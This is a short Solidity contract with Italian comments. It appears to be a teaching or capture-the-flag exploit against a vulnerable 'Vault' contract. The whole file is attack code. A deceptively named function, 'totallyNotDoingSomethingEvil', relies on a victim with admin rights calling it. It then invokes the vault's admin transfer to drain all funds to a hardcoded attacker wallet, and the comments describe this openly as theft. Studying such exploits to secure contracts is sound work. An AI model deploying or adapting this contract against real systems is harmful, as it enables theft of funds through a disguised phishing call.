// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "vault.sol";

contract Middleman {
    Vault public vault;

    // Vogliamo rubare il saldo del Vault ed esfiltrarlo qui.
    address attackerWallet = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    constructor(address payable vulerableVault) {
        // Otteniamo un riferimento all'istanza deployata del vault
        // cosi' da poterci interfacciare con esso
        vault = Vault(vulerableVault);
    }

    // Se la vittima chiama questa, possiamo prosciugare il balance del Vault
    // ereditando i suoi permessi di admin.
    function totallyNotDoingSomethingEvil() public {
        vault.admin_transferAllFundsTo(payable(attackerWallet));
    }
}